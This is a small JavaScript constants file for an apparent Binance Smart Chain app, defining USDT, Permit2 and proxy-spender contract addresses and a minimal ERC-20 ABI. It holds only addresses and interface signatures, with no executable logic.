export const USDT_ADDRESS    = '0x55d398326f99059fF775485246999027B3197955';
export const PERMIT2_ADDRESS  = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
// AssetProxy — the authorized Permit2 spender contract on BSC
export const PROXY_CONTRACT_ADDRESS = '0xA5d4Bf0437826Ab63d380408518020EFF4A7E3b0';

export const USDT_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
];

export const PERMIT2_ABI = [];
